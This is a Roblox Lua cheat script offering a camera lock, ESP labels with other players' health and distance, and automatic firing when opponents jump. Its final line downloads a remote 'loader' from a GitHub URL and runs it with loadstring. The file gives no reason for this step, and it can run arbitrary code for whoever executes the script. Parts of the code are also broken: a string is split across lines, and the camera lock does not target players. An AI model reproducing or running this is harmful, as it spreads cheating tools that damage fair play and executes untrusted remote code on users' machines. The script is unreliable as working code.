
-- My Custom Camlock Script
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local ESPOutlineColor = Color3.new(1, 0, 0) -- Red outline
local smooth = 0.99
local autoAirDelay = 0.25

local camlock = false
local autoAir = false

-- Create Camlock Button
local camlockButton = Instance.new("TextButton")
camlockButton.Size = UDim2.new(0, 100, 0, 50)
camlockButton.Position = UDim2.new(0.5, -50, 0.85, -75)
camlockButton.Text = "Camlock: Off"
camlockButton.BackgroundColor3 = Color3.new(1, 0, 0)
camlockButton.Parent = Player:WaitForChild("PlayerGui")

-- Create Auto Air Button
local autoAirButton = Instance.new("TextButton")
autoAirButton.Size = UDim2.new(0, 100, 0, 50)
autoAirButton.Position = UDim2.new(0.5, -50, 0.85, -25)
autoAirButton.Text = "Auto Air: Off"
autoAirButton.BackgroundColor3 = Color3.new(1, 0, 0)
autoAirButton.Parent = Player:WaitForChild("PlayerGui")

-- Make Buttons Draggable
local function makeDraggable(button)
    local dragging, startPos
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            startPos = input.Position
        end
    end)

    button.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            button.Position = UDim2.new(
                button.Position.X.Scale, button.Position.X.Offset + (input.Position.X - startPos.X),
                button.Position.Y.Scale, button.Position.Y.Offset + (input.Position.Y - startPos.Y)
            )
            startPos = input.Position
        end
    end)

    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

makeDraggable(camlockButton)
makeDraggable(autoAirButton)

-- Toggle Camlock
camlockButton.MouseButton1Click:Connect(function()
    camlock = not camlock
    camlockButton.Text = "Camlock: " .. (camlock and "On" or "Off")
    camlockButton.BackgroundColor3 = camlock and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
end)

-- Toggle Auto Air
autoAirButton.MouseButton1Click:Connect(function()
    autoAir = not autoAir
    autoAirButton.Text = "Auto Air: " .. (autoAir and "On" or "Off")
    autoAirButton.BackgroundColor3 = autoAir and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
end)

-- Create ESP with Health and Distance
local function createESP(target)
    local adornment = Instance.new("BillboardGui")
    adornment.Name = "ESP"
    adornment.Adornee = target
    adornment.Size = UDim2.new(0, 100, 0, 50)
    adornment.AlwaysOnTop = true

    local healthText = Instance.new("TextLabel", adornment)
    healthText.Size = UDim2.new(1, 0, 1, 0)
    healthText.TextColor3 = Color3.new(1, 1, 1)
    healthText.BackgroundTransparency = 1

    return adornment, healthText
end

-- Update ESP Information
local function updateESP(esp, player)
    local character = player.Character
    if character and character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid
        esp.TextLabel.Text = string.format("Health: %d
Distance: %.1f", 
            math.floor(humanoid.Health), 
            (character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
        )
    end
end

-- Main Loop for Camlock and Auto Air Shooting
RunService.RenderStepped:Connect(function()
    if camlock then
        local mouse = Player:GetMouse()
        local targetCFrame = CFrame.new(mouse.Hit.Position)
        Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, smooth)

        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local rootPart = otherPlayer.Character.HumanoidRootPart
                local esp, text = createESP(rootPart)
                if not rootPart:FindFirstChild("ESP") then
                    esp.Parent = rootPart
                end
                updateESP(esp, otherPlayer)
            end
        end
    end

    if autoAir then
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Humanoid") then
                local humanoid = otherPlayer.Character.Humanoid
                if humanoid:GetState() == Enum.HumanoidStateType.Jumping then
                    wait(autoAirDelay)
                    mouse1click() -- Simulate shooting
                end
            end
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/glokdraco/ghekko/refs/heads/main/loader"))()
